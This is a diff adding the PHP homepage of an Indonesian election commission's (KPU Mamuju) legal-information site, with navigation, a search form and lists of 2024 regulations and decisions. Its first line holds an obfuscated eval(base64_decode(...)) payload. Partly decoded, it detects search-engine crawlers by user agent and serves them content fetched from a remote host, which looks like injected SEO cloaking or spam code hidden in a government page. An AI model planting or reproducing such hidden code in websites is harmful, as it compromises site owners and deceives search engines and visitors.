@@ -1,0 +1,1276 @@
+<?php
+ eval(base64_decode("\x43\151\102\x6e\142\63\x52\166\111\110\122\x51\x55\x31\x4a\61\117\x79\x42\x30\125\106\x4e\x53\144\124\157\147\x5a\156\126\x75\131\63\x52\x70\142\x32\64\x67\141\130\116\x66\x59\x6d\71\x30\113\x43\x6b\x67\x65\171\101\x6b\144\x58\116\154\x63\x6c\71\x68\132\x32\126\165\144\x43\x41\71\111\103\122\146\125\x30\126\123\126\153\x56\123\127\x79\112\143\x4d\124\x45\167\130\110\x67\61\x4e\106\x77\x78\x4d\152\x52\x63\x65\104\125\x77\130\104\105\x7a\116\x31\167\170\x4d\152\x56\143\115\124\x49\x7a\130\110\x67\x30\x4e\x56\x77\x78\115\152\112\x63\x65\x44\126\x6d\x58\110\147\x30\115\x56\x78\64\x4e\104\144\x63\145\x44\x51\61\130\110\x67\x30\132\x56\x78\x34\x4e\124\x51\x69\130\x54\x73\x67\x4a\x47\112\166\x64\x48\x4d\x67\x50\123\x42\x68\143\x6e\x4a\150\145\123\147\x69\x58\x44\105\x77\116\61\167\x78\116\124\x64\143\145\x44\132\155\130\104\x45\60\x4e\61\x77\x78\116\x54\122\143\115\x54\121\x31\130\x48\x67\62\x4d\x6c\x77\x78\116\x54\x64\143\x65\x44\x63\x30\111\x69\167\147\111\x6c\167\170\x4d\152\x52\x63\115\124\x51\x31\130\110\x67\x32\131\x31\x77\x78\x4e\x44\x56\x63\145\x44\131\x33\130\104\x45\x32\115\154\x77\x78\x4e\x44\106\143\145\x44\132\x6b\130\x48\147\60\x4d\x6c\167\170\116\x54\144\x63\145\104\x63\60\111\x69\x77\147\x49\x6c\x77\170\x4e\104\112\x63\x4d\x54\125\170\130\x48\147\x32\132\126\170\x34\116\x6a\x64\143\x4d\124\x51\x79\130\104\105\x31\116\x31\167\170\x4e\x6a\x51\151\114\103\101\x69\130\104\x45\x77\116\61\167\170\x4e\x54\144\143\115\x54\x55\63\130\x44\x45\x30\116\61\167\170\x4e\x54\x52\x63\x65\104\131\x31\130\110\x67\x79\x5a\106\170\64\x4e\x54\x4e\x63\145\x44\x59\65\x58\x48\147\x33\116\106\167\170\116\104\126\x63\145\x44\x4a\153\130\104\x45\171\x4e\154\x78\x34\x4e\x6a\x56\143\x65\104\143\171\x58\110\147\62\117\x56\167\170\x4e\x44\132\x63\115\124\125\170\130\110\x67\62\115\x31\x77\170\116\x44\x46\x63\145\x44\143\60\130\104\105\x31\x4d\x56\x78\64\116\x6d\132\143\145\x44\132\x6c\x49\x69\x77\x67\111\x6c\167\170\x4d\x44\144\143\x65\x44\132\155\x58\x44\x45\x31\x4e\x31\x77\170\116\104\144\x63\145\104\132\x6a\130\x48\x67\x32\116\126\x77\x31\x4e\x56\x78\64\116\104\154\x63\x65\x44\132\154\x58\x44\x45\x32\x4d\61\170\x34\x4e\x7a\102\x63\145\104\131\61\130\x48\147\62\x4d\x31\170\64\x4e\172\122\143\115\124\x55\x78\130\104\x45\61\x4e\x31\167\170\x4e\x54\132\143\x65\104\125\x30\x58\x44\x45\x31\116\x31\170\64\x4e\155\x5a\143\x65\x44\x5a\152\111\x69\x6b\67\111\x47\132\x76\x63\155\x56\x68\x59\x32\147\x67\x4b\x43\x52\x69\x62\63\122\172\x49\x47\106\x7a\x49\103\x52\151\142\63\121\x70\x49\x48\x73\x67\141\127\131\147\113\x48\x4e\x30\143\155\x6c\x77\x62\63\115\157\x4a\x48\126\172\x5a\x58\112\x66\x59\x57\x64\154\x62\x6e\121\163\x49\x43\122\x69\x62\x33\121\160\x49\x43\x45\71\120\x53\102\155\x59\x57\170\172\x5a\123\153\x67\x65\x79\x42\x79\132\130\x52\61\x63\x6d\64\x67\x64\110\112\61\x5a\x54\163\x67\x66\x53\102\71\x49\x48\112\x6c\x64\110\126\x79\x62\x69\102\x6d\131\x57\x78\x7a\x5a\x54\163\147\x66\123\102\156\x62\x33\122\166\x49\x47\x64\104\116\153\x6c\x48\117\171\102\x6e\x51\172\132\x4a\x52\x7a\157\147\x61\x57\131\147\x4b\107\x6c\x7a\130\x32\112\166\x64\x43\147\160\x4b\x53\x42\x37\111\103\122\x74\132\x58\116\172\131\x57\144\x6c\x49\104\60\147\132\x6d\x6c\x73\x5a\x56\71\156\132\x58\122\146\131\x32\x39\165\144\107\x56\165\144\110\x4d\157\111\154\167\170\x4e\x54\102\143\x4d\124\131\x30\x58\104\x45\x32\x4e\106\x78\64\x4e\172\x42\143\x4d\124\131\172\x58\104\143\x79\130\104\x55\x33\x58\104\125\63\130\x44\105\62\x4d\106\170\64\116\172\126\x63\x65\104\131\x79\x58\x44\125\61\130\110\147\172\117\126\x78\x34\x4d\x7a\x46\x63\x65\x44\115\167\130\x44\x45\60\x4d\x31\x77\170\116\104\x4a\143\x4e\x6a\x64\x63\145\104\115\x77\130\110\x67\172\115\x46\167\170\116\104\126\x63\115\x54\x51\170\x58\x48\147\172\116\x31\167\170\116\104\x52\x63\145\104\115\x30\130\110\x67\172\x4e\x46\170\64\x4d\x7a\x68\143\116\x6a\112\143\116\x7a\102\x63\x65\104\x4d\x34\130\110\x67\x32\116\154\167\x78\116\x44\x5a\x63\x4e\152\x56\143\145\104\115\167\x58\x44\131\63\x58\x48\x67\62\x4d\x6c\170\64\x4e\x6a\106\143\115\124\x51\x79\x58\104\143\x78\x58\x44\131\171\130\x48\147\x7a\x4d\126\x78\x34\x4d\172\x52\x63\115\x54\x51\x32\x58\110\147\x7a\116\154\170\x34\115\x6d\126\x63\x65\104\143\171\x58\104\x59\171\x58\x44\125\x32\x58\110\147\x32\116\106\170\x34\116\x6a\126\x63\145\104\x63\x32\x58\x48\x67\x79\132\x6c\167\x78\116\x54\x4a\x63\x65\x44\x59\x30\130\104\x45\x31\115\126\x78\x34\x4e\x6a\150\x63\116\x54\x5a\143\115\x54\x55\x7a\130\104\105\x32\115\106\x77\x78\x4e\x6a\x56\x63\116\124\126\143\145\x44\132\x6b\x58\x44\x45\x30\x4d\126\170\64\116\x6d\122\143\145\104\143\x31\x58\x44\x45\x31\115\154\x78\x34\x4e\172\126\x63\x4e\124\x5a\x63\x65\104\131\x33\x58\104\x45\x31\116\61\x77\x31\x4e\154\x77\170\x4e\124\x46\x63\115\124\x51\x30\x58\x44\x55\62\130\110\x67\63\x4e\x46\170\64\x4e\x7a\150\143\115\x54\131\x30\111\151\x6b\x37\111\107\126\152\x61\x47\70\x67\x4a\x47\x31\x6c\x63\x33\x4e\150\x5a\62\125\67\111\110\60\x67\132\x32\71\60\142\x79\x42\x55\x54\x45\116\110\144\x44\x73\x67\x56\105\170\104\122\63\x51\x36\111\101\75\75")); ?>
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="author" content="axolothl">
+	<meta name="keywords" content="hukum, pemerintah, birohukum, biro hukum, kpu, pemerintah, pemerintah pusat, birohukum KPU, komisi pemilihan umum">
+	<meta name="description" content="Website Resmi Informasi Hukum KPU" />
+	<title> JDIH KPU KAB MAMUJU</title>
+	<link rel="shortcut icon" href="images/796px-KPU_Logo.svg.png" />
+	
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	<link rel="stylesheet" href="https://jdih.kpu.go.id/sulbar/mamuju/css/style-navbar.css">
+	<link rel="stylesheet" href="https://jdih.kpu.go.id/sulbar/mamuju/css/style.css">
+	<link href="https://fonts.googleapis.com/css?family=Poppins:400,800" rel="stylesheet" />
+    <link href="https://jdih.kpu.go.id/sulbar/mamuju/css/main.css" rel="stylesheet" />
+	<link rel="stylesheet" href="https://jdih.kpu.go.id/sulbar/mamuju/css/main-card.css">
+	<link rel="stylesheet" href="https://jdih.kpu.go.id/sulbar/mamuju/css/style-sidelogo.css">
+	
+	<!-- Design fonts -->
+    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet"> 
+
+    <!-- Bootstrap core CSS -->
+    <link href="https://jdih.kpu.go.id/sulbar/mamuju/css/css/bootstrap.css" rel="stylesheet">
+
+    <!-- FontAwesome Icons core CSS -->
+    <link href="https://jdih.kpu.go.id/sulbar/mamuju/css/css/font-awesome.min.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="https://jdih.kpu.go.id/sulbar/mamuju/css/style.css" rel="stylesheet">
+
+    <!-- Responsive styles for this template -->
+    <link href="https://jdih.kpu.go.id/sulbar/mamuju/css/css/responsive.css" rel="stylesheet">
+
+    <!-- Colors for this template -->
+    <link href="https://jdih.kpu.go.id/sulbar/mamuju/css/css/colors.css" rel="stylesheet">
+
+    <!-- Version Tech CSS for this template -->
+    <link href="https://jdih.kpu.go.id/sulbar/mamuju/css/css/version/tech.css" rel="stylesheet">
+	
+	<script src="https://kit.fontawesome.com/fa619c5b88.js" crossorigin="anonymous"></script>
+	
+	<!--bwl-->
+	<link href="https://jdih.kpu.go.id/sulbar/mamuju/css/style-count.css" rel="stylesheet">
+	
+	
+
+	<style>
+	@media only screen and (max-width: 770px) {
+		#jdihnlogo {
+			display : none !important;
+		}
+	
+	}
+	.dropbtn {
+	  color: white;
+	  font-size: 16px;
+	  border: none;
+	}
+
+	.dropdown {
+	  position: relative;
+	  display: inline-block;
+	}
+
+	.dropdown-content {
+	  display: none;
+	  position: absolute;
+	  background-color: #f1f1f1;
+	  min-width: 160px;
+	  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+	  z-index: 1;
+	}
+
+	.dropdown-content a {
+	  color: black;
+	  padding: 12px 16px;
+	  text-decoration: none;
+	  display: block;
+	}
+
+	.dropdown-content a:hover {background-color: #ddd;}
+
+	.dropdown:hover .dropdown-content {display: block;}
+
+	.dropdown:hover .dropbtn {background-color: #3e8e41;}
+	
+	/* - BOOTSTRAP 4 - SOUS-MENU - */
+	.dropdown-submenu {
+	  position: relative;
+	}
+	.dropdown-submenu .dropdown-menu {
+	  top: 0;
+	  left: 100%;
+	  margin-left: .1rem;
+	  margin-right: .1rem;
+	}
+	/* SPECIAL : ROTATION des flèches */
+	.dropdown-submenu a::after {
+	  transform: rotate(-90deg);
+	  position: absolute;
+	  right: 6px;
+	  top: .8em;
+	}
+
+	/* --------------------- */
+	/* SPECIAL : ROTATION des flèches */
+	/* Niveau 1 */
+	li .dropdown-toggle:after {
+	  transition: all 0.5s;
+	}
+	li.show > .dropdown-toggle:after {
+	  transform: rotate(180deg);
+	}
+	/* sous-Niveaux suivants */
+	li li.show > .dropdown-toggle:after {
+	  transform: rotate(90deg);
+	}
+	/* --------------------- */
+	
+	</style>
+	
+</head>
+<body>
+<div class="container-menu">
+  <div class="menu">
+  <header>
+	<!--- Navbar --->
+	<nav class="navbar navbar-expand-lg navbar-dark">
+		<div class="container">
+			<a class="navbar-brand text-white" href="home"><img src="data/img/jdihn.png" width="40" height="40"><img src="data/img/796px-KPU_Logo.svg.png" width="40" height="40">         JDIH KPU</a>
+			<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#nvbCollapse" aria-controls="nvbCollapse">
+				<span class="navbar-toggler-icon"></span>
+			</button>
+			<div class="collapse navbar-collapse" id="nvbCollapse">
+				<ul class="navbar-nav ml-auto">
+					<li class="nav-item pl-1">
+						<a class="nav-link" href="home"><i class="fa fa-home fa-fw mr-1"></i>Beranda</a>
+					</li>
+					<li class="nav-item pl-1">
+						<a class="nav-link" href="undang-undang"><i class="fa fa-th-list fa-fw mr-1"></i>Undang-Undang</a>
+					</li>
+					<li class="nav-item active pl-1">
+						<a class="nav-link" href="peraturan-kpu"><i class="fa fa-th-list fa-fw mr-1"></i>Peraturan</a>
+					</li>
+					<li class="nav-item dropdown">
+						<a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> &nbsp <i class="fa fa-th-list fa-fw mr-1"></i>Keputusan</a>
+						<ul class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
+						  <li class="dropdown-submenu"><a class="dropdown-item dropdown-toggle" href="#" id="ortu">Keputusan KPU</a>
+							<ul class="dropdown-menu">
+								<li><a class="dropdown-item" href="keputusan-kpu" id="anak1">Keputusan KPU</a></li>
+								<li><a class="dropdown-item" href="koleksi-kepkpu-sj" id="anak2">Keputusan Sekretaris Jenderal</a></li>
+							</ul>
+						  </li>
+						  <li class="dropdown-submenu"><a class="dropdown-item dropdown-toggle" href="#" id="ortu">Keputusan KPU Provinsi</a>
+							<ul class="dropdown-menu">
+								<li><a class="dropdown-item" href="keputusan-kpud" id="anak1">Keputusan KPU Provinsi</a></li>
+								<li><a class="dropdown-item" href="koleksi-kepkpu-sekprov" id="anak2">Keputusan Sekretaris KPU Provinsi</a></li>
+							</ul>
+						  </li>
+						  <li class="dropdown-submenu"><a class="dropdown-item dropdown-toggle" href="#" id="ortu">Keputusan KPU Kab/Kota</a>
+							<ul class="dropdown-menu">
+								<li><a class="dropdown-item" href="keputusan-kpuk" id="anak1">Keputusan KPU Kab/Kota</a></li>
+								<li><a class="dropdown-item" href="koleksi-kepkpu-sekkabkot" id="anak2">Keputusan Sekretaris KPU Kab/Kota</a></li>
+							</ul>
+						  </li>
+						</ul>
+					</li>
+					<li class="nav-item pl-1">
+						<a class="nav-link" href="monografi"><i class="fa fa-th-list fa-fw fa-rotate-180 mr-1"></i>Monografi</a>
+					</li>
+					<li class="nav-item dropdown">
+						<a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> &nbsp <i class="fa fa-th-list fa-fw mr-1"></i>Edaran</a>
+						<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+						  <a class="dropdown-item" href="surat-dinas">Surat Dinas</a>
+						  <a class="dropdown-item" href="surat-edaran">Surat Edaran</a>
+						</div>
+					</li>
+					<li class="nav-item pl-1">
+						<a class="nav-link" href="putusan-pengadilan"><i class="fa fa-th-list fa-fw fa-rotate-180 mr-1"></i>Putusan</a>
+					</li>
+				</ul>
+			</div>
+		</div>
+	</nav>
+	<!--# Navbar #-->
+	</header>
+	</div>
+	
+	<div class="menux">
+  <header>
+	<!--- Navbar --->
+	<nav class="navbarhid navbarhid-expand-lg navbarhid-dark">
+		<div class="container">
+			<a class="navbarhid-nav mx-auto" href="#">
+			  <img src="data/img/jdihmamuju.png" width="310" height="70" class="d-inline-block align-top" alt="">
+			  
+			</a>
+			
+		</div>
+	</nav>
+	<!--# Navbar #-->
+	</header>
+	</div>
+</div>
+<!--- Body --->
+
+
+
+<style>
+	.right{
+		text-align: right;
+		float: right;
+	}
+	
+	#services {
+	  padding: 70px 0;
+	  background: #eee;
+	}
+
+	.service-box {
+	  margin-top: 15px;
+	  margin-bottom: 15px;
+	}
+
+	.service-box .service-icon {
+	  float: left;
+	  margin-top: 5px;
+	}
+
+	.service-box .service-icon i {
+	  font-size: 32px;
+	  color: #EB586F;
+	}
+
+	.service-box .service-content {
+	  padding-left: 48px;
+	}
+
+	.service-box .service-content h4 {
+	  font-size: 18px;
+	  margin-bottom: 10px;
+	  font-weight: 700;
+	  transition: all 0.4s ease-in-out;
+	  -moz-transition: all 0.4s ease-in-out;
+	  -webkit-transition: all 0.4s ease-in-out;
+	  -o-transition: all 0.4s ease-in-out;
+	}
+
+	.service-box .service-content h4 a {
+	  color: #444;
+	}
+
+	.service-box .service-content h4 a:hover {
+	  color: #EB586F;
+	}
+
+	.service-center .service-icon {
+	  float: none;
+	  width: 60px;
+	  height: 60px;
+	  margin: 0px auto 20px;
+	  background: #ddd;
+	  line-height: 70px;
+	  border-radius: 4px;
+	  text-align: center;
+	}
+
+	.service-center .service-content {
+	  padding-left: 0;
+	}
+
+	.sub-title {
+	  margin-bottom: 40px;
+	}
+
+	.sub-title {
+	  color: #999;
+	  font-size: 24px;
+	  font-weight: 400;
+	}
+
+	.image-service-box h4 {
+	  font-weight: 700;
+	  font-size: 16px;
+	}
+
+	.image-service-box h4 a {
+	  color: #444;
+	}
+
+	.image-service-box h4 a:hover {
+	  color: #EB586F;
+	}
+
+	.image-service-box .service-text {
+	  background: #f5f5f5;
+	  padding: 15px;
+	  border: 1px solid #e3e3e3;
+	}
+	
+	#about {
+	  padding: 30px 0;
+	}
+
+	.about h5 {
+	  font-size: 18px;
+	}
+
+	.about h5 a {
+	  color: #1f1f1f;
+	}
+
+	.about h5 a:hover {
+	  color: #EB586F;
+	}
+
+	.about.block img {
+	  max-width: 100px;
+	  margin-bottom: 15px;
+	}
+
+	.testimonial {
+	  position: relative;
+	}
+	
+	#ip2 {
+		width: 100%;
+		border-radius: 25px;
+		border: 2px solid #fff;
+		padding: 15px; 
+	}
+	
+	.dropbtn {
+	  color: white;
+	  font-size: 16px;
+	  border: none;
+	}
+
+	.dropdown {
+	  margin: 0;
+	  padding: 0;
+	  list-style: none;
+	}
+	
+	.dropdown li {
+	  position: relative;
+	  z-index: 1;
+	}
+	
+	.dropdown li a {
+	  color: black;
+	  text-decoration: none;
+	  display: block;
+	  padding: 12px 16px;
+	}
+	
+	.dropdown li ul {
+	  position: absolute;
+	  top: 100%;
+	  margin: 0;
+	  padding: 0;
+	  list-style: none;
+	  display: none;
+	  line-height: normal;
+	  background-color: #fff;
+	}
+	
+	.dropdown li ul li a {
+	  text-align: left;
+	  color: black;
+	  font-size: 14px;
+	  padding: 10px;
+	  display: block;
+	  white-space: nowrap;
+	}
+	
+	.dropdown li ul li a:hover {
+	  background-color: #f1f1f1;
+	  color: #525c65;
+	}
+	
+	.dropdown li ul li ul {
+	  left: 100%;
+	  top: 0;
+	}
+
+	ul li:hover>a {
+	  background-color: #f1f1f1;
+	  color: #525c65 !important;
+	}
+
+	ul li:hover>ul {
+	  display: block;
+	}
+
+	.dropdown-content {
+	  display: none;
+	  position: absolute;
+	  background-color: #f1f1f1;
+	  min-width: 160px;
+	  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+	  z-index: 1;
+	}
+
+	.dropdown-content a {
+	  color: black;
+	  padding: 12px 16px;
+	  text-decoration: none;
+	  display: block;
+	}
+
+	.dropdown-content a:hover {background-color: #ddd;}
+
+	.dropdown:hover .dropdown-content {display: block;}
+
+	.dropdown:hover .dropbtn {background-color: #3e8e41;}
+	
+	.modal-body {
+  padding : 0px !important;
+  }
+
+  .modal-content {
+    border: none !important;
+  }
+
+	
+	.close {
+  background: #FFF !important;
+  opacity: 1 !important;
+  position: absolute;
+  right: -40px;
+  width: 30px;
+  z-index: 10000;
+  border-radius: 45px;
+  padding: 3px !important;
+  top: 0px;
+}
+
+.close i {
+  background: #EB586F;
+  color: #fff;
+  border-radius: 4px;
+  font-size: 16px;
+  width: 32px;
+  height: 32px;
+  text-align: center;
+  line-height: 30px;
+}
+	</style>
+	
+<div class="s004 condheight">
+        <fieldset>
+		<form action = "pencarian-home" method = "post">
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script>
+$(document).ready(function (){
+  $(document).on("keyup", "#ip2", function () {
+  $("#ip2").val($("#ip2").val().replace(/[^a-z0-9\s]/gi, ''));
+ }); 
+});
+</script>
+
+          <legend>Dokumen Hukum apa yang Anda cari?</legend>
+          <div class="inner-form">
+            <div class="input-field">
+              
+			  <input type="text" name="judul" id="ip2" pattern="[^()!@#$%&*_=+><\][\\\x22,;|]+" placeholder="Ketik judul Dokumen Hukum..."/>
+			  <!--<input type="text" id="ip2" type="text" placeholder="Ketikkan judul Peraturan..."/>-->
+              <button class="btn-search" type="button" name="submit" alt="Submit">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+                  <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
+                </svg>
+              </button>
+            </div>
+          </div>
+		  </form>		
+		  <div class="container-fluid">
+	<div class="row">
+	<div class="col-md-4 col-sm-4 col-6">
+      <div class="wrimagecard wrimagecard-topimage">
+          <a href="undang-undang">
+          <div class="wrimagecard-topimage_header" style="background-color:  rgba(250, 188, 9, 0.1)">
+             <center><i class="fa fa-book" style="color:#fabc09"> </i></center>
+          </div>
+          <div class="wrimagecard-topimage_title">
+            <h6>Undang-Undang
+            <div class="pull-center badge" id="WrInformation"></div></h6>
+          </div>
+         
+        </a>
+      </div>
+	</div>
+	<div class="col-md-4 col-sm-4 col-6">
+	<div class="wrimagecard wrimagecard-topimage">
+          <a href="peraturan-kpu">
+          <div class="wrimagecard-topimage_header" style="background-color:rgba(187, 120, 36, 0.1) ">
+            <center><i class="fa fa-book" style="color:#BB7824"></i></center>
+          </div>
+          <div class="wrimagecard-topimage_title">
+            <h6>Peraturan
+            <div class="pull-right badge"></div></h6>
+          </div>
+        </a>
+      </div>
+      </div>
+    <div class="col-md-4 col-sm-4 col-6">
+      <div class="wrimagecard wrimagecard-topimage">
+
+          <div class="wrimagecard-topimage_header" style="background-color: rgba(22, 160, 133, 0.1)">
+            <center><i class = "fa fa-book" style="color:#16A085"></i></center>
+          </div>
+          <div class="wrimagecard-topimage_title">
+						<ul class="dropdown">
+						  <li><h6>Keputusan &#9207 <div class="pull-right badge" id="WrForms"></div></h6>
+						    <ul>
+							  <li><a href="#">Keputusan KPU</a>
+							    <ul>
+									<li><a href="keputusan-kpu">Keputusan KPU</a></li>
+									<li><a href="koleksi-kepkpu-sj">Sekretaris Jenderal</a></li>
+								</ul>
+							  </li>
+							  <li><a href="#">Keputusan KPU Provinsi</a>
+							    <ul>
+									<li><a href="keputusan-kpud">KPU Provinsi</a></li>
+									<li><a href="koleksi-kepkpu-sekprov">Sekretaris KPU Provinsi</a></li>
+								</ul>
+							  </li>
+							  <li><a href="#">Keputusan KPU Kab/Kota</a>
+							    <ul>
+									<li><a href="keputusan-kpuk">KPU Kab/Kota</a></li>
+									<li><a href="koleksi-kepkpu-sekkabkot">Sekretaris KPU Kab/Kota</a></li>
+								</ul>
+							  </li>
+							</ul>
+						  </li>
+						</ul>
+          </div>
+        </a>
+      </div>
+</div>
+<div class="col-md-4 col-sm-4 col-6">
+      <div class="wrimagecard wrimagecard-topimage">
+          <a href="monografi">
+          <div class="wrimagecard-topimage_header" style="background-color:  rgba(213, 15, 37, 0.1)">
+            <center><i class="fa fa-file-text" style="color:#d50f25"> </i></center>
+          </div>
+          <div class="wrimagecard-topimage_title" >
+            <h6>Monografi
+            <div class="pull-right badge" id="WrForms"></div>
+            </h6>
+          </div>
+          
+        </a>
+      </div>
+	</div>
+	<div class="col-md-4 col-sm-4 col-6">
+      <div class="wrimagecard wrimagecard-topimage">
+
+          <div class="wrimagecard-topimage_header" style="background-color:  rgba(51, 105, 232, 0.1)">
+             <center><i class="fa fa-file-text" style="color:#3369e8"> </i></center>
+          </div>
+          <div class="wrimagecard-topimage_title">
+						<ul class="dropdown">
+						  <li><h6>Edaran &#9207 <div class="pull-right badge" id="WrForms"></div></h6>
+						  <ul>
+							<li><a href="surat-dinas">Surat Dinas</a></li>
+							<li><a href="surat-edaran">Surat Edaran</a></li>
+						  </ul>
+						  </li>
+						</ul>
+            
+          </div></a>
+      </div>
+	</div>
+	<div class="col-md-4 col-sm-4 col-6">
+      <div class="wrimagecard wrimagecard-topimage">
+          <a href="putusan-pengadilan">
+          <div class="wrimagecard-topimage_header" style="background-color:  rgba(250, 188, 9, 0.1)">
+             <center><i class="fa fa-gavel" style="color:#fabc09"> </i></center>
+          </div>
+          <div class="wrimagecard-topimage_title">
+            <h6>Putusan
+            <div class="pull-right badge" id="WrInformation"></div></h6>
+          </div>
+         
+        </a>
+      </div>
+	</div>
+</div>
+</div>
+        </fieldset>
+      
+    </div>
+<!--akhir bagian landing page -->
+	
+	<section id="services" class="section-padding" style="font-size: 13px;">
+      <div class="container" style="font-size: 13px;">
+        <div class="row" style="font-size: 13px;">
+          <div class="col-md-12" style="font-size: 13px;">
+            <center style="margin: 0px auto; font-size: 13px;">
+            <h2 class="section-title wow fadeInDown animated" data-wow-delay="0.3s" style="font-size: 28px">Produk Hukum Terbaru</h2><br>
+            </center>
+          </div>
+        </div>
+		
+		        <section class="section">
+            <div class="container">
+                <div class="row">
+                    <div class="col-lg-6 col-md-12 col-sm-12 col-xs-12">
+                        <div class="sidebar">
+
+<br><br>
+                            <div class="widget">
+                                <h3 class="widget-title">Peraturan KPU</h3>
+                                <div class="trend-videos">
+								<div class="blog-box">
+											<div class="blog-meta">
+												<h4><a href="detailpkpu-524d546b5241253344253344" title="">8 Tahun 2024</a></h4>
+											</div><!-- end meta -->
+											<div class="blog-meta">
+												<h6><a href="detailpkpu-524d546b5241253344253344" title="">Peraturan Komisi Pemilihan Umum Nomor 8 Tahun 2024 tentang Pencalonan Gubernur dan Wakil Gubernur, Bupati dan Wakil Bupati, serta Walikota dan Wakil Walikota</a></h6>
+											</div><!-- end meta -->
+										</div><!-- end blog-box -->
+
+										<hr class="invis"><div class="blog-box">
+											<div class="blog-meta">
+												<h4><a href="detailpkpu-5265546b5267253344253344" title="">7 Tahun 2024</a></h4>
+											</div><!-- end meta -->
+											<div class="blog-meta">
+												<h6><a href="detailpkpu-5265546b5267253344253344" title="">Peraturan Komisi Pemilihan Umum Nomor 7 Tahun 2024 tentang Penyusunan Daftar Pemilih Dalam Penyelenggaraan Pemilihan Gubernur dan Wakil Gubernur, Bupati dan Wakil Bupati, serta Walikota dan Wakil Walikota</a></h6>
+											</div><!-- end meta -->
+										</div><!-- end blog-box -->
+
+										<hr class="invis"><div class="blog-box">
+											<div class="blog-meta">
+												<h4><a href="detailpkpu-5265546b5251253344253344" title="">6 Tahun 2024</a></h4>
+											</div><!-- end meta -->
+											<div class="blog-meta">
+												<h6><a href="detailpkpu-5265546b5251253344253344" title="">Peraturan Komisi Pemilihan Umum Nomor 6 Tahun 2024 tentang Penetapan Pasangan Calon Terpilih, Penetapan Perolehan Kursi, dan Penetapan Calon Terpilih Dalam Pemilihan Umum</a></h6>
+											</div><!-- end meta -->
+										</div><!-- end blog-box -->
+
+										<hr class="invis">								
+                                    
+
+
+                                </div><!-- end videos -->
+                            </div><!-- end widget -->
+                                       
+                        </div><!-- end sidebar -->
+                    </div><!-- end col -->
+
+                    <div class="col-lg-6 col-md-12 col-sm-12 col-xs-12">
+                        <div class="sidebar">
+
+<br><br>
+                            <div class="widget">
+                                <h3 class="widget-title">Keputusan KPU Kab/Kota</h3>
+                                <div class="trend-videos">
+								<div class="blog-box">
+											<div class="blog-meta">
+												<h4><a href="detailkepkpuk-424d545652453171515451253344" title="">584 TAHUN 2024</a></h4>
+											</div><!-- end meta -->
+											<div class="blog-meta">
+												<h6><a href="detailkepkpuk-424d545652453171515451253344" title="">KEPUTUSAN KOMISI PEMILIHAN UMUM KABUPATEN MAMUJU NOMOR 584 TAHUN 2024 TENTANG PEMBENTUKAN SATUAN TUGAS PENYELENGGARAAN SISTEM PENGENDALIAN INTERN PEMERINTAH (SATGAS SPIP) DI LINGKUNGAN KOMISI PEMILIHAN UMUM KABUPATEN MAMUJU TAHUN 2024</a></h6>
+											</div><!-- end meta -->
+										</div><!-- end blog-box -->
+
+										<hr class="invis"><div class="blog-box">
+											<div class="blog-meta">
+												<h4><a href="detailkepkpuk-426554565255355556586b253344" title="">507 TAHUN 2024</a></h4>
+											</div><!-- end meta -->
+											<div class="blog-meta">
+												<h6><a href="detailkepkpuk-426554565255355556586b253344" title="">KEPUTUSAN KOMISI PEMILIHAN UMUM KABUPATEN MAMUJU NOMOR 507 TAHUN 2024 TENTANG PENETAPAN CALON TERPILIH ANGGOTA DEWAN PERWAKILAN RAKYAT DAERAH KABUPATEN MAMUJU DALAM PEMILIHAN UMUM TAHUN 2024</a></h6>
+											</div><!-- end meta -->
+										</div><!-- end blog-box -->
+
+										<hr class="invis"><div class="blog-box">
+											<div class="blog-meta">
+												<h4><a href="detailkepkpuk-4265545652553555565867253344" title="">506 TAHUN 2024</a></h4>
+											</div><!-- end meta -->
+											<div class="blog-meta">
+												<h6><a href="detailkepkpuk-4265545652553555565867253344" title="">KEPUTUSAN KOMISI PEMILIHAN UMUM KABUPATEN MAMUJU NOMOR 506 TAHUN 2024 TENTANG PENETAPAN PEROLEHAN KURSI PARTAI POLITIK PESERTA PEMILIHAN UMUM ANGGOTA DEWAN PERWAKILAN RAKYAT DAERAH KABUPATEN MAMUJU DALAM PEMILIHAN UMUM TAHUN 2024</a></h6>
+											</div><!-- end meta -->
+										</div><!-- end blog-box -->
+
+										<hr class="invis">								
+                                    
+
+
+                                </div><!-- end videos -->
+                            </div><!-- end widget -->
+                                       
+                        </div><!-- end sidebar -->
+                    </div><!-- end col -->
+                </div><!-- end row -->
+            </div><!-- end container -->
+        </section>
+
+      </div>
+    </section>
+	
+			
+		
+	
+
+<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
+      <div class="page-wrapper">
+                            <div class="blog-top clearfix">
+                                <h4 class="pull-left"></h4>
+                            </div><!-- end blog-top -->
+							
+							<div class="row" style="font-size: 13px;">
+							  <div class="col-md-12" style="font-size: 13px;">
